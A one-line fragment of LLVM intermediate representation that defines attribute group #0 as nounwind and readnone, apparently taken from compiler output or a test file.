attributes #0 = { nounwind readnone }
